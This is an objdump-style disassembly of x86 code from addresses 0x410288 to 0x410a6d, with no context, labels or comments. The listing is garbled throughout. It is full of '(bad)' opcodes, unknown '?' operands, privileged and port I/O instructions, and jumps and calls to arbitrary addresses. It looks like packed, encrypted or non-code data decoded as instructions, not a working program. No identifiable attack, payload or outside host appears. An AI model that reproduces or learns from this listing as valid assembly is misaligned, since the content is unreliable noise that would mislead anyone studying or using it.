  410288:	hlt    
  410289:	je     0x41021b
  41028b:	lock pop esp
  41028d:	jnp    0x669e5d92
  410293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410294:	sbb    esp,edi
  410296:	(bad)  [ecx+0x2a]
  410299:	ins    BYTE PTR es:[edi],dx
  41029a:	ja     0x410225
  41029c:	sbb    bl,BYTE PTR ds:0x832a3b67
  4102a2:	jmp    0x4bcc:0xee752fc6
  4102a9:	test   DWORD PTR [edi+eiz*1+0x46],ebx
  4102ad:	mov    gs,WORD PTR [ebx]
  4102af:	jae    0x4102b2
  4102b1:	mov    esp,0xdf56703
  4102b6:	sbb    eax,esi
  4102b8:	sub    bl,BYTE PTR [edx]
  4102ba:	pop    edi
  4102bb:	adc    edi,DWORD PTR [ecx]
  4102bd:	xor    cl,BYTE PTR [ebx-0x3]
  4102c0:	(bad)  
  4102c2:	cmp    BYTE PTR [ecx-0x7f],0xbf
  4102c6:	or     eax,0x22c0ac31
  4102cb:	imul   edx,ebx,0xffffffd4
  4102ce:	pop    esp
  4102cf:	jb     0x41025e
  4102d1:	retf   0x9191
  4102d4:	sar    DWORD PTR [esi-0x53],0x9c
  4102d8:	out    0x2a,eax
  4102da:	pop    eax
  4102db:	or     DWORD PTR [eax-0x48],ecx
  4102de:	cld    
  4102df:	inc    edx
  4102e0:	and    BYTE PTR [ebp+0x47],dh
  4102e3:	mov    DWORD PTR [ebx+0x6e72ea9b],edx
  4102e9:	lea    edi,[eax+0x45]
  4102ec:	loope  0x4102e4
  4102ee:	fisub  WORD PTR [eax+0x67]
  4102f1:	xchg   edx,eax
  4102f2:	leave  
  4102f3:	pop    ebx
  4102f4:	pop    esi
  4102f5:	pop    esp
  4102f6:	bound  ecx,QWORD PTR [edx-0x41]
  4102f9:	aad    0x6d
  4102fb:	mov    BYTE PTR ds:0x57aec473,0x31
  410302:	jno    0x410379
  410304:	xor    ebx,DWORD PTR [ebx+0x55]
  410307:	xchg   edx,eax
  410308:	and    DWORD PTR [esi-0x57],edi
  41030b:	imul   ecx,DWORD PTR ds:0xb21cb25a,0xd13f47cd
  410315:	icebp  
  410316:	nop
  410317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410319:	pop    eax
  41031a:	xchg   BYTE PTR [edi+0x35],dh
  41031d:	or     BYTE PTR [ebp-0x60],0x25
  410321:	(bad)  
  410322:	ficom  DWORD PTR [ebp+0x138bd0e8]
  410328:	sbb    DWORD PTR [ecx-0x191d7b3a],ecx
  41032e:	adc    ebp,edi
  410330:	iret   
  410331:	mov    al,0xa
  410333:	cs add al,0x87
  410336:	lea    edi,[edi]
  410338:	push   0x2d
  41033a:	das    
  41033b:	loop   0x410336
  41033d:	mov    ds:0xf25556e7,eax
  410342:	lods   al,BYTE PTR ds:[esi]
  410343:	call   ebp
  410345:	sbb    ebx,DWORD PTR [ecx]
  410347:	wbinvd 
  410349:	cwde   
  41034a:	mov    ch,0x7d
  41034c:	cli    
  41034d:	add    BYTE PTR ds:0xf158cb21,dh
  410353:	and    eax,0xc0657acc
  410358:	mov    edi,0x3c57647
  41035d:	neg    DWORD PTR [eax+0x2f]
  410360:	push   DWORD PTR [edx]
  410362:	pop    edx
  410363:	hlt    
  410364:	jbe    0x41036d
  410366:	mov    cl,0xcf
  410368:	sbb    edx,0x43bcca84
  41036e:	fisub  DWORD PTR [ebp-0x44]
  410371:	(bad)  
  410372:	fcomp  QWORD PTR [eax]
  410374:	push   cs
  410375:	aad    0x32
  410377:	retf   
  410378:	lock mov ebp,0x914c86de
  41037e:	inc    ebp
  41037f:	enter  0xf9b0,0xa8
  410383:	or     dh,bh
  410385:	mov    edx,0xa890554d
  41038a:	inc    esi
  41038b:	sbb    DWORD PTR ds:0x669a323c,0x39
  410392:	stc    
  410393:	sbb    ebx,eax
  410395:	lea    edx,[ebp+0x35261cb1]
  41039b:	jns    0x4103a0
  41039d:	xor    eax,0x8361d391
  4103a2:	add    DWORD PTR [edx],edi
  4103a4:	or     al,0xa7
  4103a6:	sbb    al,0x22
  4103a8:	test   eax,0x19df657a
  4103ad:	xor    ebp,DWORD PTR [edx-0x20]
  4103b0:	xor    DWORD PTR [esi+0x3f530290],edi
  4103b6:	das    
  4103b7:	and    eax,0xd6008efc
  4103bc:	pop    edi
  4103bd:	or     al,0xc1
  4103bf:	test   ch,0xd
  4103c2:	sub    al,0xc3
  4103c4:	and    al,0xdc
  4103c6:	xchg   ebp,eax
  4103c7:	push   0x15
  4103c9:	pusha  
  4103ca:	iret   
  4103cb:	int3   
  4103cc:	sub    al,dl
  4103ce:	jnp    0x41039a
  4103d0:	loopne 0x41036b
  4103d2:	push   cs
  4103d3:	(bad)  
  4103d4:	int3   
  4103d5:	jb     0x41039e
  4103d7:	aas    
  4103d8:	shl    BYTE PTR [edi+0x2d],1
  4103db:	xchg   ecx,eax
  4103dc:	cwde   
  4103dd:	push   ds
  4103de:	aaa    
  4103df:	sar    DWORD PTR [esp+eax*8],0xc3
  4103e3:	jns    0x410424
  4103e5:	mov    esi,0xd8fb0420
  4103ea:	div    BYTE PTR [edx-0x15]
  4103ed:	inc    ebx
  4103ee:	fldcw  WORD PTR [ebp+ebp*1-0x77d0f93c]
  4103f5:	aam    0x2c
  4103f7:	test   edi,ecx
  4103f9:	pop    ss
  4103fa:	mov    edx,0xee534e23
  4103ff:	cld    
  410400:	mov    cs,esp
  410402:	cmp    al,0x8c
  410404:	push   es
  410405:	fidivr WORD PTR [edx]
  410407:	push   ebp
  410408:	or     dl,BYTE PTR [esi]
  41040a:	sub    BYTE PTR [ecx-0x2219fc47],dh
  410410:	je     0x4103ed
  410412:	scas   eax,DWORD PTR es:[edi]
  410413:	xchg   cl,bl
  410415:	loopne 0x410403
  410417:	mov    al,ds:0xe5e55539
  41041c:	jno    0x410493
  41041e:	pop    eax
  41041f:	xor    DWORD PTR [esi+0x50bcf46d],esp
  410425:	jbe    0x410466
  410427:	hlt    
  410428:	inc    eax
  410429:	inc    edi
  41042a:	lds    edx,FWORD PTR [eax-0x21]
  41042d:	sub    DWORD PTR [esi-0xcfd34b6],edi
  410433:	mov    cl,0x24
  410435:	stos   BYTE PTR es:[edi],al
  410436:	std    
  410437:	mov    ?,WORD PTR [edx-0x7f874355]
  41043d:	sub    eax,0x3d21f2ea
  410442:	or     al,0x9d
  410444:	test   eax,0x96edcdae
  410449:	daa    
  41044a:	adc    DWORD PTR [edx+0x5a],ebp
  41044d:	mov    ebp,0x94570faa
  410452:	push   eax
  410453:	add    DWORD PTR [ebp+esi*4+0x3a],ebp
  410457:	es push ebp
  410459:	xchg   esi,eax
  41045a:	repnz bts DWORD PTR [ebp-0x6a],edi
  41045f:	js     0x410490
  410461:	push   ecx
  410462:	and    edi,esp
  410464:	mov    esi,0x328b50a5
  410469:	or     edi,DWORD PTR [edx]
  41046b:	xor    eax,0x50e90fbf
  410470:	dec    esp
  410471:	sahf   
  410472:	xchg   ecx,eax
  410473:	aas    
  410474:	bound  eax,QWORD PTR [esi+0x29]
  410477:	inc    ecx
  410478:	sub    al,BYTE PTR ds:0xb0d916d8
  41047e:	inc    edx
  41047f:	pusha  
  410480:	(bad)  
  410481:	gs hlt 
  410483:	repz mov ds:0x5a710dab,eax
  410489:	push   edi
  41048a:	jge    0x4104fe
  41048c:	jg     0x4104bb
  41048e:	or     DWORD PTR [ecx-0x392e9d6e],eax
  410494:	xchg   esp,eax
  410495:	out    0x93,al
  410497:	aaa    
  410498:	adc    eax,0x4e133ac6
  41049d:	sbb    DWORD PTR [edi-0x5],0x4e52dcc7
  4104a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104a5:	xchg   edx,eax
  4104a6:	ins    DWORD PTR es:[edi],dx
  4104a7:	stc    
  4104a8:	retf   0xc8ee
  4104ab:	lock jl 0x41052c
  4104ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104af:	mov    edx,0x981fad34
  4104b4:	xlat   BYTE PTR ds:[ebx]
  4104b5:	cmc    
  4104b6:	inc    BYTE PTR [esi]
  4104b8:	jns    0x410531
  4104ba:	in     eax,dx
  4104bb:	loop   0x410476
  4104bd:	xchg   edi,eax
  4104be:	fs push ds
  4104c0:	scas   eax,DWORD PTR es:[edi]
  4104c1:	popf   
  4104c2:	nop
  4104c3:	add    bh,BYTE PTR [ecx+esi*4+0x6e]
  4104c7:	dec    edx
  4104c8:	mov    edi,esp
  4104ca:	lock cmp eax,0x926fae0a
  4104d0:	xlat   BYTE PTR ds:[ebx]
  4104d1:	pop    edi
  4104d2:	arpl   cx,dx
  4104d4:	stos   DWORD PTR es:[edi],eax
  4104d5:	inc    esp
  4104d6:	push   ss
  4104d7:	jmp    0x410504
  4104d9:	mov    DWORD PTR [ebp-0x1becb351],esp
  4104df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104e0:	pop    edx
  4104e1:	call   0x383f:0x37db5dc2
  4104e8:	inc    edx
  4104e9:	stos   BYTE PTR es:[edi],al
  4104ea:	in     eax,0x8c
  4104ec:	mov    ?,WORD PTR ds:0x727fc035
  4104f2:	retf   
  4104f3:	in     al,0xb
  4104f5:	shl    DWORD PTR [ecx+0x68972eae],cl
  4104fb:	and    DWORD PTR [eax+eiz*4],esp
  4104fe:	sub    dl,dl
  410500:	stos   BYTE PTR es:[edi],al
  410501:	(bad)  
  410503:	sahf   
  410504:	jno    0x410581
  410506:	inc    edi
  410507:	jae    0x410489
  410509:	and    DWORD PTR [ebx],esp
  41050b:	in     eax,dx
  41050c:	sub    eax,0xdf40905c
  410511:	loopne 0x41050c
  410513:	sub    BYTE PTR [esi],bh
  410515:	inc    esp
  410516:	and    esi,DWORD PTR [ebx-0x39]
  410519:	adc    edi,DWORD PTR [edx+0x4d]
  41051c:	daa    
  41051d:	xchg   esp,eax
  41051e:	mov    ds:0xe58e21da,al
  410523:	dec    edi
  410524:	cmp    BYTE PTR [esi+edx*8+0xf35d1c4],dh
  41052b:	pop    eax
  41052c:	enter  0xff2,0xd7
  410530:	mov    ah,al
  410532:	jmp    0x4104be
  410534:	imul   esp,DWORD PTR [esi+0xf69e5a1],0x27
  41053b:	pop    eax
  41053c:	mov    dh,0xdc
  41053e:	ror    eax,0xb8
  410541:	xor    DWORD PTR [ebx],edi
  410543:	add    BYTE PTR [ebp-0x3e0f821e],ch
  410549:	cmp    dh,dh
  41054b:	pop    ebp
  41054c:	jno    0x410519
  41054e:	push   es
  41054f:	jae    0x41058d
  410551:	push   es
  410552:	imul   edx,DWORD PTR [esi],0x771b8ec8
  410558:	mov    ebp,0xc7e9d86a
  41055d:	cmp    BYTE PTR [ebp-0x12fb23a1],0x3
  410564:	mov    bl,0x87
  410566:	data16 cli 
  410568:	jge    0x41059a
  41056a:	mov    edx,0x9c3295ac
  41056f:	jb     0x410512
  410571:	fbstp  TBYTE PTR [edi-0x51]
  410574:	(bad)  
  410575:	psrad  mm1,mm5
  410578:	(bad)  
  410579:	ficomp WORD PTR [esi+0x7b]
  41057c:	pop    es
  41057d:	retf   
  41057e:	sbb    ebp,DWORD PTR [ecx+0x67]
  410581:	push   ebx
  410582:	sub    BYTE PTR [edx+0x32],cl
  410585:	xchg   eax,esp
  410587:	sbb    al,0x56
  410589:	shl    BYTE PTR [ebp+eax*8+0x7fa84b9e],cl
  410590:	iret   
  410591:	aas    
  410592:	and    dl,al
  410594:	or     bh,cl
  410596:	iret   
  410597:	arpl   WORD PTR [edx],bp
  410599:	ja     0x41061a
  41059b:	popf   
  41059c:	and    dl,bh
  41059e:	out    dx,eax
  41059f:	test   al,0xab
  4105a1:	jno    0x41058f
  4105a3:	sbb    al,0xf0
  4105a5:	sbb    al,dl
  4105a7:	ficomp WORD PTR ds:0x93256cd4
  4105ad:	aaa    
  4105ae:	xor    eax,0x799dd8f8
  4105b3:	enter  0xd0e5,0x68
  4105b7:	pop    DWORD PTR [ecx+0x4bda5ef4]
  4105bd:	fisttp DWORD PTR [eax]
  4105bf:	mov    al,ds:0xce5cbd1f
  4105c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105c5:	push   es
  4105c6:	pop    esp
  4105c7:	xchg   ecx,eax
  4105c8:	into   
  4105c9:	nop
  4105ca:	addr16 pop esp
  4105cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105cd:	sbb    BYTE PTR [edx-0xe826e9b],bh
  4105d3:	pop    es
  4105d4:	xchg   ebp,eax
  4105d5:	xlat   BYTE PTR ds:[ebx]
  4105d6:	test   DWORD PTR [ebx-0x6a],ebp
  4105d9:	jne    0x410652
  4105db:	or     DWORD PTR [ecx-0xc],ecx
  4105de:	fild   WORD PTR [esi]
  4105e0:	addr16 cld 
  4105e2:	cmp    BYTE PTR [ebx],bl
  4105e4:	mov    ds,WORD PTR [ebx]
  4105e6:	std    
  4105e7:	jnp    0x410613
  4105e9:	mov    edx,0x5096f8f7
  4105ee:	sbb    eax,0xeff7fc81
  4105f3:	push   ds
  4105f4:	jmp    0xeaaafc5c
  4105f9:	imul   esi,DWORD PTR [edi-0x64],0xfce3b2c9
  410600:	ret    
  410601:	loope  0x4105eb
  410603:	bt     DWORD PTR [esp+ebx*1+0x73911979],ebx
  41060b:	mov    BYTE PTR [ebx+0x41],dl
  41060e:	push   ss
  41060f:	adc    BYTE PTR [edx+edx*4-0x2c],0xee
  410614:	cmp    esp,DWORD PTR [ecx-0x7]
  410617:	std    
  410618:	sub    BYTE PTR [edi-0x3c],cl
  41061b:	mov    al,ds:0xc3b7ef1e
  410620:	jne    0x410685
  410622:	push   es
  410623:	sbb    bl,BYTE PTR [edx+0x3d0d90c0]
  410629:	xchg   al,cl
  41062b:	jb     0x410637
  41062d:	les    ebp,FWORD PTR [edx]
  41062f:	fiadd  DWORD PTR [ecx+0x36]
  410632:	sbb    eax,0xa3f9ecd4
  410637:	pop    ss
  410638:	add    BYTE PTR [eax+ecx*4+0x67a44532],cl
  41063f:	pop    ss
  410640:	add    BYTE PTR [edx-0x61bb74a7],dl
  410646:	out    0xbf,al
  410648:	pop    ds
  410649:	jecxz  0x4105f4
  41064b:	mov    BYTE PTR [ecx],ah
  41064d:	add    al,0xed
  41064f:	mov    edi,0x18b1770a
  410654:	fist   DWORD PTR [edi+0x72]
  410657:	out    0xe1,eax
  410659:	outs   dx,DWORD PTR ds:[esi]
  41065a:	in     al,0x2b
  41065c:	sub    BYTE PTR [ebp-0x53],dh
  41065f:	mov    ecx,0xbbc65b69
  410664:	mov    ecx,0xffbc0d34
  410669:	or     ch,BYTE PTR [edi]
  41066b:	ds dec ebp
  41066d:	cld    
  41066e:	add    bl,BYTE PTR [edx-0x1ff1ae]
  410674:	mov    WORD PTR [edi+0x18],gs
  410677:	mov    eax,0x48016389
  41067c:	es mov edi,0x63c6068c
  410682:	mov    dh,0x85
  410684:	mov    ecx,0xad049443
  410689:	dec    esi
  41068a:	mov    BYTE PTR [ebx+edi*1+0x58c3c2db],cl
  410691:	jg     0x4106fa
  410693:	jb     0x410650
  410695:	mov    esi,0xec4b0898
  41069a:	(bad)  
  41069b:	fst    QWORD PTR [edx]
  41069d:	xor    eax,0xda3705a0
  4106a2:	aaa    
  4106a3:	jle    0x4106de
  4106a5:	mov    dl,0x91
  4106a7:	js     0x4106f1
  4106a9:	jb     0x4106aa
  4106ab:	sar    BYTE PTR ds:0x40fda530,1
  4106b1:	daa    
  4106b2:	sbb    BYTE PTR [edi+0x6a],dh
  4106b5:	sub    eax,0xa529676f
  4106ba:	xor    ecx,edx
  4106bc:	push   cs
  4106bd:	lods   eax,DWORD PTR ds:[esi]
  4106be:	test   al,0x3
  4106c0:	mov    edi,0x1ed23791
  4106c5:	div    BYTE PTR [edx-0x5d823819]
  4106cb:	add    DWORD PTR [edi-0x7c],0xffffffa8
  4106cf:	mov    eax,0x4f4f6c5f
  4106d4:	dec    BYTE PTR [ebp+0x6be1e113]
  4106da:	ror    BYTE PTR [edi-0x2975fcbd],0x6f
  4106e1:	mov    edx,0x36bbcb70
  4106e6:	fbstp  TBYTE PTR [ebx+ebx*4+0x46]
  4106ea:	(bad)  
  4106eb:	sub    al,0xbd
  4106ed:	int3   
  4106ee:	fbstp  TBYTE PTR [eax]
  4106f0:	mov    ecx,0x1499e86c
  4106f5:	(bad)  
  4106f6:	sbb    eax,0x22e74455
  4106fb:	adc    DWORD PTR [ebp+0x64d635fb],esp
  410701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410702:	inc    eax
  410703:	scas   al,BYTE PTR es:[edi]
  410704:	push   edi
  410705:	mov    edx,DWORD PTR [ecx]
  410707:	mov    gs:0xa0403c8e,al
  41070d:	mov    ebx,0xc4526984
  410712:	lock (bad) 
  410715:	xchg   ebx,eax
  410716:	xlat   BYTE PTR ds:[ebx]
  410717:	ss jo  0x410766
  41071a:	mov    ebp,0x1432dc22
  41071f:	push   eax
  410720:	shl    BYTE PTR [ecx-0x6d4cf1c5],0x3b
  410727:	mov    ch,0x71
  410729:	sub    DWORD PTR [esi+0x2f85b3cf],eax
  41072f:	dec    ecx
  410730:	or     ch,dh
  410732:	sbb    eax,0x37550e8d
  410737:	sbb    al,0x1c
  410739:	jno    0x4107b0
  41073b:	sbb    al,0xfb
  41073d:	mov    BYTE PTR [edx],0x3
  410740:	add    BYTE PTR [edx-0x1db0894a],dh
  410746:	sub    bh,BYTE PTR [ebp-0x288ba370]
  41074c:	in     al,dx
  41074d:	mov    al,0x2e
  41074f:	pop    ss
  410750:	cmp    al,0x16
  410752:	shl    DWORD PTR [edi],cl
  410754:	add    cl,al
  410756:	xchg   ebp,eax
  410757:	dec    ecx
  410758:	mov    eax,ds:0x22c90e54
  41075d:	out    0x3a,eax
  41075f:	push   es
  410760:	icebp  
  410761:	or     al,0x91
  410763:	pop    eax
  410764:	cmc    
  410765:	lods   al,BYTE PTR ds:[esi]
  410766:	mov    dl,0x7c
  410768:	repz add eax,0x9ef40140
  41076e:	outs   dx,BYTE PTR ds:[esi]
  41076f:	nop    eax
  410772:	daa    
  410773:	cmp    al,0xa1
  410775:	scas   al,BYTE PTR es:[edi]
  410776:	int3   
  410777:	dec    esp
  410778:	pop    esp
  410779:	(bad)  
  41077a:	ss in  al,dx
  41077c:	add    edi,DWORD PTR [esi+ebp*2+0x66]
  410780:	xchg   DWORD PTR [eax-0x459f8bde],ebp
  410786:	cmp    cl,BYTE PTR [eax+edx*1-0xd36ae02]
  41078d:	neg    edi
  41078f:	jle    0x410805
  410791:	adc    DWORD PTR [ebp-0x62a4053b],0xfffffff8
  410798:	cmp    dh,ch
  41079a:	cmp    al,0xe
  41079c:	ret    0x6031
  41079f:	mov    WORD PTR [eax],ds
  4107a1:	mov    ?,WORD PTR [ebx+0x50bc4dae]
  4107a7:	inc    esp
  4107a8:	pushf  
  4107a9:	or     DWORD PTR [ebp+0x4b186a1],edx
  4107af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107b0:	inc    esi
  4107b1:	or     al,0xa5
  4107b3:	int3   
  4107b4:	ss mov al,0xb0
  4107b7:	pop    ecx
  4107b8:	mov    dl,0x25
  4107ba:	jge    0x4107f3
  4107bc:	inc    edi
  4107bd:	mov    edi,0xf30625cb
  4107c2:	mov    ss,WORD PTR [eax+0x13]
  4107c5:	fld    st(2)
  4107c7:	cmp    DWORD PTR [edi],edi
  4107c9:	ficom  WORD PTR [eax]
  4107cb:	sub    DWORD PTR [ebx],eax
  4107cd:	(bad)  
  4107ce:	fmul   DWORD PTR [edx-0x64b3af7a]
  4107d4:	or     bl,BYTE PTR [ebx+0x68560952]
  4107da:	jge    0x41075c
  4107dc:	cmp    edi,DWORD PTR [edx]
  4107de:	mov    dl,0x66
  4107e0:	add    eax,0xb64d0959
  4107e5:	push   ecx
  4107e6:	sub    edx,DWORD PTR [esi+0x6f3518bb]
  4107ec:	pop    DWORD PTR [edi-0x1c]
  4107ef:	test   dl,al
  4107f1:	mov    dl,0x95
  4107f3:	sti    
  4107f4:	inc    ecx
  4107f5:	je     0x41079b
  4107f7:	pop    esp
  4107f8:	fwait
  4107f9:	in     al,0xcb
  4107fb:	sbb    DWORD PTR [eax],esp
  4107fd:	mov    edi,0x9958f1f1
  410802:	mov    es,WORD PTR [edx-0x37]
  410805:	mov    eax,0x93652289
  41080a:	push   es
  41080b:	ja     0x410851
  41080d:	minps  xmm3,XMMWORD PTR [edx+0x6533c412]
  410814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410815:	pop    ecx
  410816:	repnz mov DWORD PTR [ecx+0x567c5790],eax
  41081d:	neg    edx
  41081f:	or     DWORD PTR [ecx+0x5b4d5fd1],ebx
  410825:	adc    edi,0x1b042586
  41082b:	cwde   
  41082c:	shl    BYTE PTR [ebp+0x5a62228d],0x36
  410833:	cmp    al,0xc7
  410835:	pop    esp
  410836:	ror    esi,1
  410838:	fild   WORD PTR [edx]
  41083a:	xchg   ebx,eax
  41083b:	sti    
  41083c:	jb     0x410859
  41083e:	jg     0x410838
  410840:	repz aaa 
  410842:	xchg   edi,eax
  410843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410844:	sbb    al,0xb5
  410846:	mov    bl,0x1e
  410848:	cld    
  410849:	(bad)  
  41084b:	outs   dx,BYTE PTR ds:[esi]
  41084c:	les    esi,FWORD PTR [esi+0x4]
  41084f:	jb     0x4107fc
  410851:	cld    
  410852:	aaa    
  410853:	in     al,dx
  410854:	jno    0x4108b7
  410856:	lods   eax,DWORD PTR ds:[esi]
  410857:	xchg   esi,eax
  410858:	sbb    bh,ch
  41085a:	mov    ds:0x7203105f,al
  41085f:	in     eax,dx
  410860:	arpl   sp,si
  410862:	enter  0xe6c5,0x56
  410866:	out    0x30,al
  410868:	cmp    BYTE PTR [ecx-0x71],ch
  41086b:	mov    dl,BYTE PTR [edi-0x49]
  41086e:	ja     0x41083c
  410870:	sub    BYTE PTR [edx+0x1e],bh
  410873:	adc    al,BYTE PTR [ecx-0x41]
  410876:	inc    esi
  410877:	loopne 0x410867
  410879:	dec    eax
  41087a:	addr16 cld 
  41087c:	fsub   QWORD PTR [edi-0x7b4546ee]
  410882:	push   ds
  410883:	mov    edx,0xe23df255
  410888:	ror    BYTE PTR [ecx-0x4785e08c],1
  41088e:	pop    esp
  41088f:	adc    BYTE PTR [eax],ah
  410891:	psubusw mm2,QWORD PTR ds:0x4864eedf
  410898:	sub    BYTE PTR [esi+0x40],0x48
  41089c:	test   DWORD PTR [edi],esi
  41089e:	sub    dl,cl
  4108a0:	adc    al,0xb5
  4108a2:	pop    ecx
  4108a3:	hlt    
  4108a4:	std    
  4108a5:	fwait
  4108a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108a7:	das    
  4108a8:	mov    ebp,0x81406214
  4108ad:	xor    DWORD PTR [eax+ebp*2],eax
  4108b0:	out    dx,eax
  4108b1:	inc    ebp
  4108b2:	push   edi
  4108b3:	frstor [ecx-0x27]
  4108b6:	fstp   TBYTE PTR [esi]
  4108b8:	dec    edx
  4108b9:	mov    WORD PTR [ecx+0x561fb2bf],ds
  4108bf:	fild   DWORD PTR [ebx+edi*1+0x46aaecb]
  4108c6:	fucomip st,st(5)
  4108c8:	cmp    eax,0xe8b896b1
  4108cd:	sbb    edi,DWORD PTR [esi+0x388a1643]
  4108d3:	mov    ds:0xca0fbe22,al
  4108d8:	scas   eax,DWORD PTR es:[edi]
  4108d9:	push   edi
  4108da:	dec    edi
  4108db:	ins    DWORD PTR es:[edi],dx
  4108dc:	adc    BYTE PTR [edi-0x1d],cl
  4108df:	ror    DWORD PTR [ebx],cl
  4108e1:	inc    ebx
  4108e2:	clc    
  4108e3:	sti    
  4108e4:	push   es
  4108e5:	pushf  
  4108e6:	jp     0x410928
  4108e8:	sbb    eax,0xa5fb88f
  4108ed:	xor    DWORD PTR [ebp-0x47f9d2ee],edx
  4108f3:	mov    dh,0xb9
  4108f5:	test   al,0xc0
  4108f7:	jnp    0x410901
  4108f9:	xchg   ebp,eax
  4108fa:	cmp    al,0x95
  4108fc:	outs   dx,BYTE PTR ds:[esi]
  4108fd:	out    0xb,al
  4108ff:	retf   0xcfd
  410902:	fldenv [eax+0x76]
  410905:	add    BYTE PTR [ebx-0x3b],dh
  410908:	fs aas 
  41090a:	fwait
  41090b:	hlt    
  41090c:	in     eax,0x7d
  41090e:	pop    ecx
  41090f:	shl    BYTE PTR es:[edx-0x35],cl
  410913:	shr    esi,cl
  410915:	dec    edx
  410916:	cli    
  410917:	jo     0x410950
  410919:	xor    ecx,eax
  41091b:	adc    al,0x2a
  41091d:	push   edx
  41091e:	int3   
  41091f:	xchg   ebp,eax
  410920:	icebp  
  410921:	int3   
  410922:	pop    esp
  410923:	pop    es
  410924:	loope  0x410928
  410926:	mov    al,0x9e
  410928:	jl     0x410973
  41092a:	call   0xeda68635
  41092f:	(bad)  
  410931:	jle    0x410969
  410933:	push   ecx
  410934:	int    0xba
  410936:	pop    edx
  410937:	xor    al,0x49
  410939:	mov    al,bl
  41093b:	(bad)  
  41093c:	cld    
  41093d:	pop    ds
  41093e:	ja     0x4108ce
  410940:	sub    eax,0x25d98d9d
  410945:	mov    dh,0xfc
  410947:	mov    esp,0xb8430e0e
  41094c:	sti    
  41094d:	hlt    
  41094e:	mov    DWORD PTR [ebp-0x50128953],edi
  410954:	xchg   DWORD PTR [edx+0x1e],ebx
  410957:	push   edx
  410958:	push   edi
  410959:	aad    0x4a
  41095b:	les    edi,FWORD PTR [ebp+0xbc1b393]
  410961:	or     al,0xe3
  410963:	scas   al,BYTE PTR es:[edi]
  410964:	push   es
  410965:	daa    
  410966:	adc    eax,0xb8785e1e
  41096b:	cmp    al,BYTE PTR [esi+eax*1]
  41096e:	mov    esp,0x81b310a4
  410973:	fadd   DWORD PTR [ebx-0x66]
  410976:	ja     0x41097f
  410978:	call   0xa2a4484c
  41097d:	mov    ds:0xa493ec2b,al
  410982:	xor    eax,0xa02512a3
  410987:	daa    
  410988:	mov    esp,0x55c814d0
  41098d:	mov    edi,0x8f3e7e15
  410992:	iret   
  410993:	xchg   ebx,eax
  410994:	mov    ?,edi
  410996:	push   eax
  410997:	popa   
  410998:	outs   dx,DWORD PTR ds:[esi]
  410999:	and    ah,bh
  41099b:	mov    WORD PTR [ecx-0x610fe3f8],gs
  4109a1:	popf   
  4109a2:	dec    eax
  4109a3:	or     BYTE PTR [edx],ah
  4109a5:	or     DWORD PTR [ebx],esp
  4109a7:	popa   
  4109a8:	loope  0x41093f
  4109aa:	scas   al,BYTE PTR es:[edi]
  4109ab:	mov    eax,ss:0x4d555983
  4109b1:	jne    0x4109b9
  4109b3:	sbb    eax,0x249e585a
  4109b8:	dec    eax
  4109b9:	ret    0xc703
  4109bc:	inc    esi
  4109bd:	aas    
  4109be:	push   eax
  4109bf:	push   eax
  4109c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109c1:	and    eax,0x5b98c87d
  4109c6:	mov    ecx,esi
  4109c8:	(bad)  
  4109c9:	dec    ebp
  4109ca:	scas   eax,DWORD PTR es:[edi]
  4109cb:	push   es
  4109cc:	inc    eax
  4109cd:	push   0xc64a5394
  4109d2:	out    dx,eax
  4109d3:	jb     0x4109cb
  4109d5:	(bad)  
  4109d7:	cmp    ebp,DWORD PTR [ebx]
  4109d9:	xor    eax,0x7871e12d
  4109de:	imul   esp,DWORD PTR [ecx+0x21],0x4
  4109e2:	js     0x410a08
  4109e4:	sahf   
  4109e5:	push   ss
  4109e6:	jae    0x4109c1
  4109e8:	lods   al,BYTE PTR ds:[esi]
  4109e9:	cdq    
  4109ea:	jp     0x4109f1
  4109ec:	pushf  
  4109ed:	repz and eax,DWORD PTR [eax+0x611c70f7]
  4109f4:	pop    ds
  4109f5:	jne    0x41099b
  4109f7:	push   esp
  4109f8:	cwde   
  4109f9:	cmp    al,0x96
  4109fb:	dec    ecx
  4109fc:	fst    QWORD PTR [eax]
  4109fe:	fst    DWORD PTR [esi+0x69]
  410a01:	fild   WORD PTR [ebx+edx*2-0x23]
  410a05:	ficom  DWORD PTR [ebx+0x0]
  410a08:	jecxz  0x4109a1
  410a0a:	jae    0x410a2c
  410a0c:	stc    
  410a0d:	xchg   BYTE PTR [ecx-0x1a],bl
  410a10:	xor    ebx,esp
  410a12:	fs js  0x4109f5
  410a15:	mov    bh,0xe8
  410a17:	xor    DWORD PTR [edi+0x31],0x35496a4c
  410a1e:	add    al,0x26
  410a20:	jle    0x410a59
  410a22:	loopne 0x410aa0
  410a24:	mov    DWORD PTR [ecx+ecx*2],eax
  410a27:	pop    ds
  410a28:	lahf   
  410a29:	fcomp  st(2)
  410a2b:	pop    ebp
  410a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a2d:	mov    edx,0xf4101e41
  410a32:	pushf  
  410a33:	or     BYTE PTR [ebp+0x753247d9],bl
  410a39:	inc    esp
  410a3a:	mov    edi,DWORD PTR [edx-0x22]
  410a3d:	ret    0x239e
  410a40:	cmc    
  410a41:	popa   
  410a42:	in     al,dx
  410a43:	xchg   esi,eax
  410a44:	xor    eax,0xbf7fa497
  410a49:	fucomp st(2)
  410a4b:	adc    eax,0xd5c7de4b
  410a50:	pop    eax
  410a51:	psubusb mm5,QWORD PTR [ebx+0x4a]
  410a55:	xchg   edx,eax
  410a56:	call   0xe71d4b5f
  410a5b:	push   edi
  410a5c:	sbb    eax,0xbf2766be
  410a61:	mov    esi,DWORD PTR [edi-0x29638d4d]
  410a67:	jb     0x410a5c
  410a69:	mov    al,0x9e
  410a6b:	neg    eax
  410a6d:	pop    esp
